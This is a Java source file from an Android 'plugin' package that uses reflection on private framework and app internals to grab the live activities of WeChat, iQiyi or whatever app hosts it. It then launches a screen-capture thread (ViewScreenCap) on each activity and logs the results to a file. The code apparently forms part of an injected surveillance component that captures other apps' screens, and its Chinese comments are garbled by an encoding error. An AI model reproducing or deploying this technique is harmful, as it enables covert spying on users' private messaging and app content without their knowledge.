package com.plugin;

import java.lang.ref.WeakReference;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import android.app.Activity;
import android.content.Context;
import android.util.ArrayMap;
import android.util.Log;
import java.util.ArrayList;

import com.authority.AuthoritySettings;
import com.utils.WriteDateFile;

//System.err: android.view.ViewRootImpl$CalledFromWrongThreadException: 
//Only the original thread that created a view hierarchy can touch its views.


//public static ActivityThread currentActivityThread() {
//	return sCurrentActivityThread;
//}

/*
public final Activity getActivity(IBinder token) {
        return mActivities.get(token).activity;
}
 */


/*
//IBinder����,AMS���д˶���Ĵ�����󣬴Ӷ�֪ͨActivityThread������������
final ApplicationThread mAppThread = new ApplicationThread();
final Looper mLooper = Looper.myLooper();
final H mH = new H();
//�洢�����е�Activity,��IBinder��Ϊkey,IBinder��Activity�ڿ�ܲ��Ψһ��ʾ
final ArrayMap<IBinder, ActivityClientRecord> mActivities = new ArrayMap<>();
//�洢�����е�Service
final ArrayMap<IBinder, Service> mServices = new ArrayMap<>();
//ActivityThread�����õ�������󣬿��Է��������������Ҫ�ķ���
private static ActivityThread sCurrentActivityThread;

    public final Application getApplication() {
        return mApplication;
    }
*/

//com.tencent.mm.ui.MMFragmentActivity; 	classes.dex
//public class MMFragmentActivity extends AppCompatActivity
//ArrayList<WeakReference<MMFragment>> record = new ArrayList();
//com.tencent.mm.ui.LauncherUI;		classes.dex
//public class LauncherUI extends MMFragmentActivity
//private static ArrayList<LauncherUI> tkk;


public class GetActivity extends Thread{
	
	private static String TAG = "GetActivityRun";
	Context mContext;
	
	public GetActivity(Context context){
		mContext = context;
	}
	
	@Override
	public void run(){
		
		try {
			ArrayList <Activity> activities = null;
			while(true){
				activities = getActivities(mContext);
				if (activities == null) {
					Thread.sleep(60000);
					continue;
				}else{
					break;
				}
			}
			
			for (int i = 0; i < activities.size(); i++) {
				Activity activity = activities.get(i);
				AuthoritySettings.checkPluginPermission(activity,mContext);
				
				new Thread(new ViewScreenCap(activity, mContext)).start();
				
				Log.e(TAG,"GetActivity:" + activity +" ok\r\n");
				WriteDateFile.writeLogFile("GetActivity:" + activity +" ok\r\n");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static ArrayList <Activity> getActivities(Context context){
		ArrayList <Activity> activities = null;
		try {
			activities = GetActivity.getActivity();
			if (activities == null || activities.size() <= 0) {
				if (context.getPackageName().contains("com.qiyi.video")) {
					activities = GetActivity.getIqiyiActivity(context);
				}else if (context.getPackageName().contains("com.tencent.mm")) {
					activities = GetActivity.getWechatActivities(context);
				}
			}
		}catch(Exception ex){
			ex.printStackTrace();
		}	
		
		return activities;
	}
	
	@SuppressWarnings("unchecked")
	public static ArrayList< Activity> getWechatActivities(Context context ){
		String TAG = "getWechatActivities";
		ArrayList< Activity> list = new ArrayList<>();

		try {
			String clsname = "com.tencent.mm.ui.LauncherUI";
		    //String clsname = context.getPackageName() + ".LauncherUI";
			
			Class<?> launcheruicls = null;
			try {
			    launcheruicls = Class.forName(clsname);
			    if (launcheruicls == null) {
			    	Log.e(TAG, "Class forName " + clsname + " error");
					return list;
				}
			} catch (Exception e) {
				Log.e(TAG, "Class forName " + clsname + " exception");
				e.printStackTrace();
				return list;
			}
			
			Object obj = null;
			try {
				obj = launcheruicls.newInstance();
				Log.e(TAG, "object:" + obj);
			} catch (Exception e) {
				e.printStackTrace();
				return list;
			}

		    Field flauncherui = null;
	        try {
	        	Field[] fields = launcheruicls.getDeclaredFields();
	        	if (fields == null) {
	        		Log.e(TAG, "getDeclaredFields exception");
	        		return list;
				}
	        	
	            for (Field field : fields) {
	            	String strfield = field.toString();
	                field.setAccessible(true);
	                //String fieldtype = field.getType().toString();
	                //String fieldname = field.getName();

	                if(strfield.contains("java.util.ArrayList") && 
	                		strfield.contains("LauncherUI") &&
	                		Modifier.isStatic(field.getModifiers()))
	                {
	                	Log.e(TAG, "find " + strfield);
	                
	                	flauncherui = field;
	                }
	            }
	        } catch (Exception e) {
	        	Log.e(TAG, "getDeclaredFields exception");
	            e.printStackTrace();
	            return list;
	        }

	        //java.lang.reflect.Field.get(Object obj)��������ָ���������ɴ�Field��ʾ���ֶε�ֵ��
	        //����ö������ԭʼ���ͣ����ֵ���Զ���װ�ڶ�����
	        //�˴��Ǵ�sCurrentActivityThread��ȡmActivities
	        //���ߴ�classֱ�ӻ�ȡ ��һ����ʵ��
	        ArrayList<Activity> launcheruis = (ArrayList<Activity>) flauncherui.get(obj);
	        
		    
		    //1 java.lang.InstantiationException: 
		    //java.lang.Class<com.tencent.mm.ui.LauncherUI> has no zero argument constructor
		    //2 <init> must be public
		    //Object launcherui = launcheruicls.newInstance();
	        //ArrayList<Activity> launcheruis1 = (ArrayList<Activity>) flauncherui.get(launcherui);

	        if (launcheruis != null && launcheruis.size() > 0) {
	        	list = launcheruis;
	        	Log.e(TAG, "successfully get mm ArrayList<LauncherUI>:" + launcheruis.toString());
			}else{
				Log.e(TAG, "failed to get mm ArrayList<LauncherUI>" );
			}
		} catch (Exception e) {
			e.printStackTrace();
			Log.e(TAG, "unknown exception");
		}
		return list;
	}
	
	

	@SuppressWarnings("unchecked")
	public static ArrayList< Activity> getActivity() {
		String TAG = "GetActivity";
	    try {
		    ArrayList< Activity> list = new ArrayList<>();
		    
		    Class<?> activityThreadClass = null;
		    try {
			    activityThreadClass = Class.forName("android.app.ActivityThread");
		        if (activityThreadClass == null) {
		        	Log.e(TAG, "Class android.app.ActivityThread null");
		        	return list;
				}else{
					Log.e(TAG, "Class android.app.ActivityThread:" + activityThreadClass.toString());
				}
			} catch (Exception e) {
				Log.e(TAG, "Class forName android.app.ActivityThread exception");
				return list;
			}
		    
		    Field factivityThread = null;
	        try {
			    factivityThread = activityThreadClass.getDeclaredField("sCurrentActivityThread");
		        if (factivityThread == null) {
		        	Log.e(TAG, "factivityThread null");
		        	return list;
				}else{
					factivityThread.setAccessible(true);
					Log.e(TAG, "factivityThread:" + factivityThread.toString());
				}
			} catch (Exception e) {
				Log.e(TAG, "factivityThread exception");
				return list;
			}
	        
	        
	    	Method mcurrentActivityThread = null;
	    	try {
		    	mcurrentActivityThread = activityThreadClass.getMethod("currentActivityThread");
		    	mcurrentActivityThread.setAccessible(true);
		    	
		    	Log.e(TAG, "method currentActivityThread:" + mcurrentActivityThread);
			} catch (Exception e) {
	        	Log.e(TAG, "get currentActivityThread method exception");
	        	return list;
			}


		    Object activityThread = null;
		    try {
		    	activityThread = mcurrentActivityThread.invoke(null);
		        if (activityThread == null) {
		        	Log.e(TAG, "sCurrentActivityThread null");
		        	return list;
				}else{
					Log.e(TAG, "sCurrentActivityThread:" + activityThread.toString());
				}        
			} catch (Exception e) {
				Log.e(TAG, "get sCurrentActivityThread exception");
				return list;
			}
		        
//		    Object activityThread1 = null;
//	        try {
//			    activityThread1 = activityThreadClass.getMethod("currentActivityThread").invoke(activityThreadClass);
//		        if (activityThread1 == null) {
//		        	Log.e(TAG, "activityThread1 null");
//		        	//return list;
//				}else{
//					Log.e(TAG, "activityThread1:" + activityThread1.toString());
//				}
//			} catch (Exception e) {
//				Log.e(TAG, "activityThread1 exception");
//			}

		    Field activitiesField = null;
		    try {
			    Class <?> actcls = activityThread.getClass();
			    if (actcls == null) {
		        	Log.e(TAG, "get activityThread Class error");
		        	return list;
				}else{
					Log.e(TAG, "Class android.app.ActivityThread:" + actcls.toString());
				}
			    
//	            Field[] fields = actcls.getDeclaredFields();
//	            for (int i=0;i<fields.length;i++){//����
//	                try {
//	                    //�õ�����
//	                    Field subfield = fields[i];
//	                    //��˽�з���
//	                    subfield.setAccessible(true);
//	                    //��ȡ����
//	                    String name = subfield.getName();
//	                    Log.e(TAG, "get sub field name:" + name);
//	                } catch (Exception e) {
//	                    e.printStackTrace();
//	                }
//	            }

			    activitiesField = actcls.getDeclaredField("mActivities");
		    	//activitiesField = activityThreadClass.getDeclaredField("mActivities");
		        if (activitiesField == null) {
		        	Log.e(TAG, "activityThread get mActivities null");
		        	return list;
				}else{
			        activitiesField.setAccessible(true);
			        Log.e(TAG, "activityThread mActivities:" + activitiesField.toString());
				}
			} catch (Exception e) {
				Log.e(TAG, "get activityThread mActivities exception");
				e.printStackTrace();
				return list;
			}
		    
		    //final ArrayMap<IBinder, ActivityClientRecord> mActivities = new ArrayMap<>();
		    ArrayMap <Object, Object>activities = null;
		    try {
		    	Object testobj =  activitiesField.get(activityThread);
		    	Log.e(TAG, "test activityThread mActivities value:" + testobj.toString());
		        //java.lang.reflect.Field.get(Object obj)��������ָ���������ɴ�Field��ʾ���ֶε�ֵ��
			    activities = (ArrayMap<Object, Object>) activitiesField.get(activityThread);
		        if (activities == null ) {
		        	Log.e(TAG, "get activityThread mActivities value null");
		        	return list;
				}else{
					Log.e(TAG, "get activityThread mActivities value:" + activities.toString());
				}
			} catch (Exception e) {
				Log.e(TAG, "get activityThread mActivities value exception");
				return list;
			}

	        
	        for (Object activityRecord : activities.values()) {
	            Class <?>activityRecordClass = activityRecord.getClass();
	            //Field pausedField = activityRecordClass.getDeclaredField("paused");
	            //pausedField.setAccessible(true);
	            //if (!pausedField.getBoolean(activityRecord)) {
	                Field activityField = activityRecordClass.getDeclaredField("activity");
	    	        if (activityField == null) {
	    	        	Log.e(TAG, "activity field null");
	    	        	continue;
	    			}else{
	    				Log.e(TAG, "activity field:"+activityField.toString());
	    			}
	    	        
	                activityField.setAccessible(true);
	                Activity activity = (Activity) activityField.get(activityRecord);
	    	        if (activity == null) {
	    	        	Log.e(TAG, "activity null");
	    	        	continue;
	    			}else{
		                list.add(activity);
		                Log.e(TAG, "find activity:"+activity);
		                WriteDateFile.writeLogFile("find activity:"+activity + "\r\n");
	    			}
	            //}
	        }
	        
	        if (list != null && list.size() > 0) {
				return list;
			}
	    }catch(Exception e){
	    	Log.e(TAG, "unknown exception");
	    	e.printStackTrace();
		    WriteDateFile.writeLogFile("getActivity exception\r\n");
	    }

	    return null;
	}
	
	
	
	
	@SuppressWarnings("rawtypes")
	public static void setAttributeConstructor(Class <?> cls){
		String tag = "setAttributeConstructor";
		try {
			Constructor[] c = cls.getDeclaredConstructors();
			for(Constructor con:c){				
				Log.e(tag,Modifier.toString(con.getModifiers())+ ":" + con.getName());			
			
				Class class2[] = con.getParameterTypes();  			
				for(int i = 0;i<class2.length; i++){					
					Log.e(tag,"arg:" +class2[i].getSimpleName());					
					if(i!=class2.length-1){
						Log.e(tag,"complete");								
					}
				}				
			}			
			Constructor cs1 = cls.getDeclaredConstructor();	
			cs1.setAccessible(true);
			Object obj = cs1.newInstance();			
			Log.e(tag,"constructor:"+obj.toString());						
//			Constructor cs2 = cls.getConstructor(int.class);			
//			obj = cs2.newInstance(123);			
//			System.out.println(obj.toString());						
//			Constructor cs3 = cls.getDeclaredConstructor(int.class, String.class, double.class);			
//			cs3.setAccessible(true);		
//			obj = cs3.newInstance(123, "����", 2.2);			
//			System.out.println(obj.toString());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	
	
	
/*
getMethods()����ĳ��������й��ã�public������������̳���Ĺ��÷�������ȻҲ��������ʵ�ֽӿڵķ�����
getDeclaredMethods()�����ʾ�����ӿ����������з���������������������Ĭ�ϣ��������ʺ�˽�з��������������̳еķ�����
��ȻҲ��������ʵ�ֽӿڵķ�����
*/
	@SuppressWarnings("unchecked")
	public static ArrayList< Activity> getIqiyiActivity(Context context){
		ArrayList< Activity> list = new ArrayList<>();
		
		String tag = "getIqiyiActivity";
		Activity activity = null;
		try {
			
			Class <?> cls = Class.forName("org.qiyi.android.video.MainActivity");
			//Class <?> cls = Class.forName("org.qiyi.video.homepage.c.u");
			
			//setAttributeConstructor(cls);
			Log.e(tag, "cls:" + cls.toString());
						
		    Field fweakref = null;
	        try {
	        	Field[] fields = cls.getDeclaredFields();
	        	if (fields == null) {
	        		Log.e(TAG, "getDeclaredFields exception");
	        		return list;
				}
	        	
	            for (Field field : fields) {
	            	String strfield = field.toString();
	                field.setAccessible(true);
	                //String fieldtype = field.getType().toString();
	                //String fieldname = field.getName();

	                if(strfield.contains("WeakReference") && 
	                		strfield.contains("org.qiyi.android.video.MainActivity") &&
	                		Modifier.isStatic(field.getModifiers()))
	                {
	                	Log.e(TAG, "find " + strfield);
	                
	                	fweakref = field;
	                	break;
	                }
	            }
	        } catch (Exception e) {
	        	Log.e(TAG, "getDeclaredFields exception");
	            e.printStackTrace();
	            return list;
	        }
			
	        if (fweakref == null) {
				return list;
			}
	        
			Log.e(tag, "field:" + fweakref.toString());
			
			fweakref.setAccessible(true);
			
			Object object = cls.newInstance();
			Log.e(tag, "object:" + object.toString());
			
			WeakReference<Object> myweakRef = (WeakReference<Object>)fweakref.get(object);
			Log.e(tag, "myweakRef:" + myweakRef.toString());
			activity = (Activity)myweakRef.get();

			//activity = (Activity)field.get(object);
			
			Log.e(tag, "activity:" + activity.toString());
			
			
			list.add(activity);
			return list;

		} catch (Exception e) {
			Log.e(tag, "get activity exception");
			e.printStackTrace();
		}
		return list;
	}
	
	
	
	
	public static Activity getOldIqiyiActivity(Context context){
		String tag = "getIqiyiActivity";
		Activity activity = null;
		
		//Looper.prepare();
		//Looper.loop();
		
		Class <?> mycls = null;
		try {
			mycls = Class.forName("com.qiyi.video.WelcomeActivity$aux");
			
			Log.e(tag, "com.qiyi.video.WelcomeActivity$aux:" + mycls.toString());
		} catch (Exception e) {
			Log.e(tag, "Class forname com.qiyi.video.WelcomeActivity$aux exception");
			e.printStackTrace();
			return activity;
		}
		
//		setAttributeConstructor(mycls);
//		
//		Object myObject = null;
//		try {
//			myObject = mycls.newInstance();
//			Log.e(tag, "class newInstance:" + myObject.toString());
//		} catch (Exception e) {
//			Log.e(tag, "class newInstance exception");
//			e.printStackTrace();
//		}
//			
//		Field myfield = null;
//		try {
//			myfield = mycls.getDeclaredField("a");
//			Log.e(tag, "field a:" + myfield.toString());
//			myfield.setAccessible(true);
//
//			Activity testActivity = (Activity)myfield.get(myObject);
//			
//			Log.e(tag, "field a instance:" + testActivity.toString());
//			
//		} catch (Exception e) {
//			Log.e(tag, "get field instance exception");
//			e.printStackTrace();
//		}
		
		
		Method method = null;
		try {
			method = mycls.getDeclaredMethod("a");
			Log.e(tag, "a:" + method.toString());
			
			method.setAccessible(true);

			activity = (Activity)method.invoke(null);
			Log.e(tag, "get activity:" + activity.toString());
			return activity;
		} catch (Exception e) {
			Log.e(tag, "get method or invoke a exception");
			e.printStackTrace();
		}
		
		return null;
	}
	
	
	public static Context getContext(){
		try {
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(TAG, "context null");
			}else{
				Log.e(TAG, "get context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
				return context;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return null;
	}
}




//�洢��Activity�ı�ʾ����ActivityClientRecord
/*
static final class ActivityClientRecord {
       //Ψһ��ʾ
      IBinder token;
      int ident;
      Intent intent;
      String referrer;
      IVoiceInteractor voiceInteractor;
      Bundle state;
      PersistableBundle persistentState;
      //����洢��������Activity����
      Activity activity;
      Window window;
      Activity parent;
      String embeddedID;
      Activity.NonConfigurationInstances lastNonConfigurationInstances;
      boolean paused;
      boolean stopped;
      boolean hideForNow;
      Configuration newConfig;
      Configuration createdConfig;
      Configuration overrideConfig;
      // Used for consolidating configs before sending on to Activity.
      private Configuration tmpConfig = new Configuration();
      ActivityClientRecord nextIdle;
      ProfilerInfo profilerInfo;
      ActivityInfo activityInfo;
      CompatibilityInfo compatInfo;
      LoadedApk packageInfo;
      List<ResultInfo> pendingResults;
      List<ReferrerIntent> pendingIntents;
      boolean startsNotResumed;
      boolean isForward;
      int pendingConfigChanges;
      boolean onlyLocalRequest;
      View mPendingRemoveWindow;
      WindowManager mPendingRemoveWindowManager;
  }
*/




